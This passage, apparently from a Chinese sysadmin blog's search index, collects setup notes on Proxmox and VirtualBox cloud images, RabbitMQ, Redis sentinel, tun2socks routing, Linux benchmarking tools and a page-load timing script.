设置删除掉所有的默认即可, 最后完成创建 完成创建后, 登陆到 PVE 主机上面，使用命令qm importdisk 100 aliyun_3_x64_20G_nocloud_alibase_20240528.qcow2 local-lvm 将 qcow2 导入到虚拟机中，100为虚拟机的VM ID, local-lvm是要存储的位置， 没有 qm 命令，安装下 cloud-init 软件包 导入完成后， 在硬件里面可以看到一个 未使用的磁盘0, 然后双击编辑, 一般默认即可(总线/设备调整为SCSI) 在 选项 中，选择 引导顺序，将添加的那块磁盘设为第一启动项 在 Cloud-init 中，设置下 用户名 / 密码 启动虚拟机 Virtualbox 中使用 Cloud 系统镜像快速创建虚拟机 以Alibaba Cloud Linux 3云镜像为例，下载aliyun_3_x64_20G_nocloud_alibase_20240528.vhd 和 seed.img, seed.img是 cloud-init 数据源，可以自己创建参考官方文档或者阿里云文档的生成示例。 虚拟机创建和配置 新建虚拟机， 虚拟机光盘无需指定，类型和版本按照自己使用的云镜像指定，然后一直下一步, 虚拟硬盘选择不添加虚拟硬盘， 然后点击下一步， 直到完成创建。 完成创建后, 右键创建好的虚拟机，选择设置， 理论上所有设置都可以使用默认值， 只需要更改一个地方。 选择 存储，选择控制器: IDE，右键添加cloud-init源, 就是下载的那个seed.img或者自己创建的(需要先注册到Virtualbox，这个步骤在测试时候发现不做似乎没什么影响，只是进去后使用的是下载镜像默认的帐号名密码，Alibaba Cloud Linux 3的是alinux:aliyun,这个在阿里云文档中手动生成配置文件中可以看到)。 选择 存储 , 选择 控制器: SATA, 在右侧设置中将型号改为virtio-scsi(这个步骤是必须的), 然后右键添加硬盘, 选择下载的aliyun_3_x64_20G_nocloud_alibase_20240528.vhd(同样需要先注册到Virtualbox)。 选择 网络，连接方式根据自己情况调整，高级中控制芯片修改为 准虚拟化网络(virtio-net), 然后确定修改。 最后正常启动虚拟机即可(注意： 第一次启动可能会比较慢，多等待一些时间就可以了， 启动后注意先配置好网络). PVE 添加额外菜单-监控组件 // 当前测试版本为 8.2.2 // 修改Web界面源代码 /usr/share/pve-manager/js/pvemanagerlib.js(注意备份) // 搜索到内容 `if (caps.nodes['Sys.Audit']) {`，大概在 43869 行, 注意搜索结果会有多个。 // 可以将前端界面修改为英文，然后随便改一个 gettext 内的内容刷新，看是否找对位置。 // 添加菜单，完整内容如下 if (caps.nodes['Sys.Audit']) { me.items.push( { xtype: 'pveNodeSummary', title: gettext('Summary'), iconCls: 'fa fa-book', itemId: 'summary', }, { xtype: 'pmxNotesView', title: gettext('Notes'), iconCls: 'fa fa-sticky-note-o', itemId: 'notes', }, /// 添加内容开始 { xtype: 'prometheusMonitorView', title: 'Prometheus 监控', iconCls: 'fa fa-line-chart', itemId: 'note-prometheus', } /// 添加内容结束 ); } /// 在文件最末尾添加 Ext.define('PVE.node.PrometheusMonitor', { extend: 'Ext.panel.Panel', alias: 'widget.prometheusMonitorView', scrollable: true, bodyPadding: 5, initComponent: function() { var me = this; var prometheusIframe = { xtype: 'component', autoEl: { tag: 'iframe', style: 'height: 100%; width: 100%; border: none;', src: 'https://sogou.com', frameborder: 0, scrolling: 'auto' } }; Ext.apply(me, { layout: 'fit', items: [prometheusIframe] }); me.callParent(); } }); binlog 解析工具 https://github.com/zhuchao941/canal2sql # 常用参数 ## -sql_type: 只解析指定类型，支持 insert,update,delete,ddl。多个类型用逗号隔开，如--sql-type=insert,delete。可选。默认为insert,update,delete,ddl ## -filter: 白名单,指定导出，多个逗号隔开 \u003c库名\u003e.\u003c表名\u003e(db.*、*.*) ## -mode: onli","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:0:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":null,"content":"Redis高并发常见3大问题 缓存穿透、缓存击穿、缓存雪崩","date":"2025-05-20","objectID":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/","tags":null,"title":"Redis高并发常见3大问题","uri":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/"},{"categories":null,"content":"缓存穿透 他是指大量请求访问的数据，在缓存和数据库中均不存在，导致请求直接穿透缓存层，频繁访问数据库，造成数据库压力过大，响应过慢，甚至宕机。其原因可能是黑客构造大量不存在的key发送请求，或者业务代码逻辑bug，查询了大量key不存在或者无效数据。 解决方案 在数据查询不到数据时，向redis缓存一个空值，并设置一个较短的过期时间(比如5分钟)，这样下次请求相同的key时就能命中缓存，将空值返回给客户端。 使用布隆过滤器对所有的key进行预判，对于不存在的key，直接返回或拒绝请求，只有存在的key才会去查询缓存 对请求参数进行校验，过滤掉明显无效的请求，如ID格式必须合法等，只有合法的ID才会去查询缓存 缓存击穿 他是指某个热点数据在缓存中过期，导致大量请求同时访问数据库，造成数据库瞬间压力过大，甚至服务不可用 解决方案 对于核心热点数据，可以设置永不过期，或者使用定时任务定期更新缓存，确保热点数据可以命中缓存 在缓存失效时，使用分布式锁(如redis的setnx)保证只有一个请求去查询数据库，其他请求等待，该请求查询到数据库后在更新到缓存中，这样后续请求就又能命中缓存了 缓存雪崩 他是指大量缓存数据在同一时间点过期，导致大量请求直接访问数据库，造成数据库崩溃，可能的原因是设置了相同的过期时间，或者redis服务器宕机或者重启 解决方案 设置不同的过期时间，避免大量数据同时过期 缓存预热，在系统启动时，提前将热点数据加载到缓存中 熔断降级，使用熔断器(如Hystrix)对请求进行限流，限制数据库访问量，当数据库压力过大时候，直接返回默认值或错误提示 ","date":"2025-05-20","objectID":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/:0:0","tags":null,"title":"Redis高并发常见3大问题","uri":"/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/"},{"categories":["linux","运维记事"],"content":"RabbitMQ单机环境搭建","date":"2024-12-31","objectID":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","tags":["linux","解决方案"],"title":"RabbitMQ单机环境搭建","uri":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":" 前言 本文内容基于 Alibaba CloudLinux 3 操作系统部署、测试 Erlang 26.2.5.6-1 RabbitMQ 3.13.7-1 RabbitMQ 单机部署 安装 安装依赖环境 $\u003e dnf install unixODBC unixODBC-devel SDL make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel -y 通过RPM包，安装erlang和rabbitmq。RabbitMQ是基于Erlang语言编写的，所以需要先安装Erlang(另: 不同版本的RabbitMQ所使用的Erlang版本不一样,注意自行判断)。 $\u003e dnf install erlang-26.2.5.6-1.el8.x86_64.rpm rabbitmq-server-3.13.7-1.el8.noarch.rpm -y 配置 启动 RabbitMQ $\u003e systemctl start rabbitmq-server.service 启动 RabbitMQ 的 Web UI 界面, 有一个默认帐号(guest/guest), 但该帐号仅限于本地登陆使用 http://localhost:15672 $\u003e rabbitmq-plugins enable rabbitmq_management Enabling plugins on node rabbit@b05eab96337f: rabbitmq_management The following plugins have been configured: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatch Applying plugin configuration to rabbit@b05eab96337f... The following plugins have been enabled: rabbitmq_management rabbitmq_management_agent rabbitmq_web_dispatch started 3 plugins. 修改 RabbitMQ 用户信息 $\u003e rabbitmqctl list_users # 查看已有的用户 Listing users ... user tags guest [administrator] $\u003e rabbitmqctl list_permissions # 显示每个用户在 RabbitMQ 中的各种权限 Listing permissions for vhost \"/\" ... user configure write read guest .* .* .* $\u003e rabbitmqctl delete_user guest # 删除默认的 guest 用户，防止未经授权的访问 Deleting user \\\"guest\\\" ... # rabbitmqctl add_user \u003cusername\u003e \u003cpassword\u003e $\u003e rabbitmqctl add_user admin admin@123 # 创建新的用户 Adding user \"admin\" ... Done. Don\\'t forget to grant the user permissions to some virtual hosts! See 'rabbitmqctl help set_permissions' to learn more. $\u003e rabbitmqctl set_user_tags admin administrator # 用于赋予用户特定的角色或权限级别的标签 Setting tags for user \"admin\" to [administrator] ... $\u003e rabbitmqctl set_permissions admin \".*\" \".*\" \".*\" # 设置权限。这里的三个\".*\"分别对应配置（configure）权限、写入（write）权限和读取（read）权限。\".*\"是一个通配符，表示对所有资源（如所有队列、交换器等）都赋予相应的权限。 Setting permissions for user \"admin\" in vhost \"/\" ... ","date":"2024-12-31","objectID":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:0:0","tags":["linux","解决方案"],"title":"RabbitMQ单机环境搭建","uri":"/posts/linux/rabbitmq%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"Redis主从复制+哨兵","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","运维记事"],"content":"1. 测试版本: redis 6.2.14 $\u003e make PREFIX=/opt/redis-server/6.2.14 install $\u003e mkdir -p /opt/redis-server/6.2.14/{data,logs,etc} $\u003e mkdir -p /opt/redis-server/6.2.14/sentinel_data/26379 1.1 配置文件额外修改以下参数(多少个节点，多少个独立配置文件) # 配置 redis.conf masterauth \u003cpassword\u003e # 与redis.conf中密码一致(此项在每个节点都要配置) slaveof \u003cmasterip\u003e \u003cmasterport\u003e # 指定主节点ip和端口(此项只在从节点上进行配置) # 配置 sentinel.conf port: \u003cport\u003e # 21 pidfile: /pathto/sentinel_\u003cport\u003e.pid # 31 logfile: /pathto/logs/sentinel_\u003cport\u003e.log # 36 dir: /path/sentinel_data/\u003cport\u003e # 64 ## \u003cmaster-name\u003e 主节点名称, 可以自定义 ## \u003cmaster-ip\u003e \u003cmaster-port\u003e 主节点ip和端口 ## \u003cquorum\u003e 指定需要有2个以上sentinel节点认为redis主节点失效, 才是真的失效, 一般为: sentinel总数/2+1 sentinel monitor \u003cmaster-name\u003e \u003cmaster-ip\u003e \u003cmaster-port\u003e \u003cquorum\u003e # 84 , 此项每个节点都要配置 sentinel auth-pass mymaster \u003cpassword\u003e # 105 插入 此项, 与redis.conf中密码一致(此项在每个节点都要配置) sentinel down-after-milliseconds mymaster 30000 # 125 此项是指定 主机节点多少毫秒无响应，则认为挂了, 默认30s ## 主备切换时, 最多有多少个slave同时对新的master进行同步, 这里设置为默认的1 sentinel parallel-syncs mymaster 1 # 200 ## 故障转移的超时时间毫秒, 默认: 180000毫秒 sentinel failover-timeout mymaster 180000 # 225 1.2 创建 systemd 管理单元 [Unit] Description=Redis Sentinel(%i) After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/opt/redis-server/6.2.14/bin/redis-server /opt/redis-server/6.2.14/etc/sentinel_%i.conf --sentinel ExecStop=/usr/bin/redis-cli -p %i sentinel shutdown Type=simple User=redis Group=redis RuntimeDirectory=redis RuntimeDirectoryMode=0755 LimitNOFILE=10240 [Install] WantedBy=multi-user.target 1.3 其他 配置完成后提供给用户的是 sentinel 的端口, 而不是 redis 的端口 sentinel 在启动后，会将哨兵集群的元数据信息写入所有sentinel的配置文件里去 主从切换后，sentinel 会自动更新配置文件，将新主机的信息写入到sentinel的配置文件中, 并且主动更新 redis 配置文件 ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:0:0","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","windows","运维记事"],"content":"Linux下使用tun2socks进行两地网络连接","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":" 之前写了一个关于内网回拨解决方案, 主要是介绍在PPTP不好用的情况下，两地机房网络如何进行内网连接，该篇推荐使用的是badvpn, 但该仓库已经归档很久了。这篇介绍另一个工具 tun2socks 来替代badvpn。 关于为什么记录这个，可以翻看之前的文章内网回拨解决方案, 本篇只记录相关的整合脚本。 tun2socks 安装 在 https://github.com/xjasonlyu/tun2socks/releases 中找到适合自己系统的二进制程序，下载后解压到/usr/local/bin下即可。 tun2socks-control 用于管理路由的添加和删除 /usr/local/bin/tun2socks-control #!/usr/bin/bash ################################################# # author 0x5c0f # date 2023-04-27 # email mail@0x5c0f.cc # web tools.0x5c0f.cc # version 1.2.0 # last update 2024-06-11 # descript Use : ./tun2socks-control -h ################################################# PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # Log level [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"${LOG_LEVEL:-info}\" # proxy model PROXY_MODEL=\"${PROXY_MODEL}\" # local dev LOCAL_NETWORK_DEV=\"${LOCAL_NETWORK_DEV:-eth0}\" # tun dev TUN_NETWORK_DEV=\"${TUN_NETWORK_DEV:-tun1}\" # tun ip prefix TUN_NETWORK_PREFIX=\"${TUN_NETWORK_PREFIX:-10.3.6}\" # route ip TUN_ROUTE_IP=($(eval echo ${SOCKS_ROUTE})) _START() { ip tuntap add dev \"${TUN_NETWORK_DEV}\" mode tun ip addr add \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip link set \"${TUN_NETWORK_DEV}\" up # add route for _ip in ${TUN_ROUTE_IP[@]}; do ip route add \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # start tun2socks (https://github.com/xjasonlyu/tun2socks.git) tun2socks -device ${TUN_NETWORK_DEV} -proxy ${PROXY_MODEL} -interface ${LOCAL_NETWORK_DEV} -loglevel ${LOG_LEVEL} } _STOP() { # delete route for _ip in ${TUN_ROUTE_IP[@]}; do ip route del \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # delete network dev ip link set \"${TUN_NETWORK_DEV}\" down ip addr del \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip tuntap del dev \"${TUN_NETWORK_DEV}\" mode tun } main() { case \"$1\" in \"start\") _START ;; \"stop\") _STOP ;; *) echo \"$0 start|stop\" ;; esac } main $@ tun2socks 用于配置需要绑定的路由和socks信息 /etc/sysconfig/tun2socks ## tun2socks 日志级别 [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"info\" ## https://github.com/xjasonlyu/tun2socks/wiki/Proxy-Models # \u003c此项必填\u003e PROXY_MODEL=\"socks5://127.0.0.1:1083\" ## 本地网络设备接口 (default: eth0) LOCAL_NETWORK_DEV=\"eth0\" # tun 设备名(default: tun1) TUN_NETWORK_DEV=\"tun3\" # tun 绑定的网段 (default: 10.3.6.0/24) TUN_NETWORK_PREFIX=\"10.3.6\" # 只支持ipv4 ROUTE_HOST=\"\" # 支持配置多个 空格隔开 SOCKS_ROUTE=\"${ROUTE_HOST}\" # SOCKS_ROUTE=\"${IPSB_HOST} ${DOCKER_HOST} $(curl -s https://api.github.com/meta | jq -r '[.web[] | select(contains(\\\":\\\") | not)] | join(\\\" \\\")')\" 用于管理 tun2socks 服务的 systemd /etc/systemd/system/tun2socks.service [Unit] Description=tun2socks https://github.com/xjasonlyu/tun2socks.git After=network.target # Requires=socketssh-tun.service [Service] Type=simple EnvironmentFile=/etc/sysconfig/tun2socks PIDFile=/run/tun2socks.pid ExecStart=/usr/local/bin/tun2socks-control start ExecStopPost=/usr/local/bin/tun2socks-control stop [Install] WantedBy=multi-user.target 加载启动 $\u003e sudo systemctl daemon-reload $\u003e sudo systemctl start tun2socks.service 其他信息 windows 理论可用，可参考脚本进行调整 其他信息参考 内网回拨解决方案 ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:0:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"Linux 性能基准测试工具及测试方法","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"graph TB A[Linux 性能基准/测试] --\u003e B[CPU] A --\u003e C[内存] A --\u003e D[磁盘 IO] A --\u003e E[文件 IO] A --\u003e F[网络] A --\u003e G[应用程序] B --\u003e H[Super_Pi 测试单线程性能] B --\u003e I[sysbench 测试多线程性能] C --\u003e J[stream 测试内存带宽] D --\u003e K[fio 测试IOPS] D --\u003e L[fio 测试吞吐量] E --\u003e M[fio 测试IOPS] E --\u003e N[fio 测试吞吐量] F --\u003e O[netperf 测试带宽] F --\u003e P[netperf 测试PPS] G --\u003e Q[wrk 测试 Nginx QPS] graph TB A[Linux 性能基准/测试] --\u003e B[CPU] A --\u003e C[内存] A --\u003e D[磁盘 IO] A --\u003e E[文件 IO] A --\u003e F[网络] A --\u003e G[应用程序] B --\u003e H[Super_Pi 测试单线程性能] B --\u003e I[sysbench 测试多线程性能] C --\u003e J[stream 测试内存带宽] D --\u003e K[fio 测试IOPS] D --\u003e L[fio 测试吞吐量] E --\u003e M[fio 测试IOPS] E --\u003e N[fio 测试吞吐量] F --\u003e O[netperf 测试带宽] F --\u003e P[netperf 测试PPS] G --\u003e Q[wrk 测试 Nginx QPS]CPU Super_Pi Super_Pi 是一种用于计算圆周率π的程序，通常用于测试计算机性能和稳定性。它的主要用途是测量系统的单线程性能，因为它是一个单线程应用程序。 # 安装 bc $\u003e yum -y install bc # 测试 , 根据运行结果。查看 real 行，时间越短，性能越好 $\u003e time echo \"scale=5000; 4*a(1)\" | bc -l -q \u0026\u003e1 sysbench 素数计算 # 安装 sysbench $\u003e yum -y install sysbench # 测试方法: 启动4个线程计算10000事件所花的时间 ## 结果分析，看 total time 即可，时间越短，性能越好 $\u003e sysbench cpu --threads=4 --events=10000 --time=0 run 内存 内存带宽(stream) Stream测试是内存测试中业界公认的内存带宽性能测试基准工具 # 编译安装 STREAM $\u003e yum -y install gcc gcc-gfortran $\u003e git clone https://github.com/jeffhammond/STREAM.git $\u003e cd STREAM/ $\u003e make # 指定线程数 $\u003e export OMP_NUM_THREADS=1 # 结果分析，看 Copy、Scale、Add、Triad，数值越大，性能越好 $\u003e ./stream_c.exe 磁盘 IO/文件 IO 磁盘 IO 和 文件 IO的测试方法一致，将对应的 --filename 值修改为具体的磁盘即可，如 /dev/sda(注:磁盘IO测试时，请用空盘测试) 磁盘/文件读、写iops iops：磁盘的每秒读写次数，这个是随机读写考察的重点 # 安装 $\u003e yum -y install fio # 测试随机读 IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randread --filename=/home/randread.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # 测试随机写 IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randwrite --filename=/home/randwrite.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # 结果分析，看 IOPS 即可，值越大，性能越好 因地制宜，灵活选取。在基准测试时，一定要注意根据应用程序 I/O 的特点，来具体评估指标 比如 etcd 磁盘性能衡量指标为：WAL 文件系统调用 fsync 的延迟分布，当 99% 样本的同步时间小于 10 毫秒就可以认为存储性能能够满足 etcd 的性能要求。 $\u003e mkdir etcd-bench $\u003e fio --rw=write --ioengine=sync --fdatasync=1 --directory=etcd-bench --size=22m --bs=2300 --name=etcd-bench 网络 传输速率(pps) # server \u0026 client 编译安装 netserver $\u003e wget -c \"https://codeload.github.com/HewlettPackard/netperf/tar.gz/netperf-2.5.0\" -O netperf-2.5.0.tar.gz $\u003e yum -y install gcc cc $\u003e tar zxvf netperf-2.5.0.tar.gz $\u003e cd netperf-netperf-2.5.0 $\u003e ./configure \u0026\u0026 make \u0026\u0026 make install # server 端启动 netserver $\u003e netserver # 监控数据 $\u003e sar -n DEV 5 # client 端测试 $\u003e netperf -t UDP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 64 -R 1 \u0026 # 监控数据 $\u003e sar -n DEV 5 # 结果分析，看 rxpck/s,txpck/s 值即可，值越大，性能越好 网络带宽 宽带测速还有个工具-iperf3 https://iperf.fr/iperf-download.php # server 端启动 netserver $\u003e netserver # 监控数据 $\u003e sar -n DEV 5 # client 端测试 $\u003e netperf -t TCP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 1500 -R 1 \u0026 # 监控数据 $\u003e sar -n DEV 5 # 结果分析，看 rxkB/s,txkB/s 值即可，值越大，性能越好 单向时延 # 服务端： yum install -y sockperf sockperf sr --daemonize \u003e /dev/null 2\u003e\u00261 # 客户端： sockperf under-load -i serverip --mps=100000 -t 300 -m 14 --reply-every=50 --full-log=sockperf.out # mps: 每秒多少请求 -t 测试时间 -m 每个请求大小(默认14byte) Nginx # 安装 ab 工具 $\u003e yum -y install httpd-tools # 编译安装 wrk $\u003e git clone https://github.com/wg/wrk.git $\u003e make $\u003e cp wrk /usr/local/bin/ # 测试，-c表示并发连接数1000，-t表示线程数为2，-d 表示测试时间 ## # 结果分析，Requests/sec 为 QPS $\u003e wrk -t12 -c400 -d30s \u003cURL\u003e ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:0:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","解决方案"],"content":"可用来统计页面加载时间，js组件直接插入到html末尾即可","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/","tags":["linux","javascript","scripts"],"title":"页面加载时间统计","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","解决方案"],"content":"js 组件 直接保存为文件, 插入到 html 末尾即可, 用来统计当前页面的各类加载时间然后推送到远端(当然，后端需要自己构建接口) \u003cscript id=\"tracking-script\" src=\"./pcheck.js\" data-tracking-code=\"{{ TRACKING_CODE }}\"\u003e\u003c/script\u003e // 采集信息推送目标 const apiUrl = \"//example.com/rz/api/v1/performance/webpage/data/\"; // 日志打印控制变量, 由后端服务控制 let enableLog = true; // 获取跟踪代码 function getTrackingCode() { try { const currentScript = document.getElementById(\"performance-check-script\"); return currentScript.getAttribute(\"data-tracking-code\"); } catch (error) { console.error(error); console.log('请在引入该脚本的script标签上添加id=\"performance-check-script\"属性'); return null; } } // 采集数据推送 async function sendPerformanceData(data) { if (!data.tracking_code) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } if (enableLog) console.log(\"Sending performance data:\", data); const postOptions = { method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify(data) }; try { const response = await fetch(apiUrl, postOptions); if (response.ok) { const result = await response.json(); if (enableLog) console.log(\"Performance data sent successfully:\", result); } else { if (enableLog) console.error(`Request failed with status: ${response.status}`); } } catch (error) { if (enableLog) console.error(\"Error sending performance data:\", error); } } // 收集性能数据的主函数 async function collectPerformanceData() { const trackingCode = getTrackingCode(); if (!trackingCode) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } let performanceData; if (window.PerformanceNavigationTiming) { const entry = performance.getEntriesByType(\"navigation\")[0]; performanceData = extractPerformanceDataFromNavigationEntry(entry); } else { performanceData = extractPerformanceDataFromTimingAPI(); } performanceData.tracking_code = trackingCode; performanceData.request_uri = window.location.pathname; performanceData.tracking_domain = window.location.hostname; await sendPerformanceData(performanceData); } function extractPerformanceDataFromNavigationEntry(entry) { return { frontend_performance: entry.duration, dns_time: entry.domainLookupEnd - entry.domainLookupStart, redirect_time: entry.redirectEnd - entry.redirectStart, dom_load_time: entry.domContentLoadedEventEnd - entry.domContentLoadedEventStart, ttfb_time: entry.responseStart - entry.requestStart, content_load_time: entry.loadEventStart - entry.responseEnd, onload_callback_time: entry.loadEventEnd - entry.loadEventStart, dns_cache_time: entry.domainLookupStart, unload_time: entry.unloadEventEnd - entry.unloadEventStart, tcp_handshake_time: entry.connectEnd - entry.connectStart }; } function extractPerformanceDataFromTimingAPI() { const timing = performance.timing; return { frontend_performance: timing.loadEventEnd - timing.navigationStart, dns_time: timing.domainLookupEnd - timing.domainLookupStart, redirect_time: timing.redirectEnd - timing.redirectStart, dom_load_time: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart, ttfb_time: timing.responseStart - timing.requestStart, content_load_time: timing.loadEventStart - timing.responseEnd, onload_callback_time: timing.loadEventEnd - timing.loadEventStart, dns_cache_time: timing.domainLookupStart, unload_time: timing.unloadEventEnd - timing.unloadEventStart, tcp_handshake_time: timing.connectEnd - timing.connectStart }; } // 当脚本加载完成后立即执行 (function () { if (document.readyState === \"complete\") { setTimeout(collectPerformanceData, 0); } else { window.addEventListener(\"load\", function () { setTimeout(collectPerformanceData, 0); }); } })(); // 提供一个方法来控制日志打印 function setLogEnabled(enabled) { enableLog = enabled; } ","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/:0:0","tags":["linux","javascript","scripts"],"title":"页面加载时间统计","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","整理收集"],"content":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":" 带宽与宽带的区别是什么 带宽是量词，指的是网速的大小，比如1Mbps的意思是一兆比特每秒，这个数值就是指带宽。 宽带是名词，说明网络的传输速率速很高 。宽带的标准各不相同，最初认为128kbps以上带宽的就是宽带，而以下的就是窄带。 但现在国内运营商一般提供至少512kbps带宽的宽带服务。也就是说，带宽是一个具体数值，而宽带则是满足一定带宽数值的一种传输标准(服务)。 即：宽带是一种业务，带宽是传输速度。 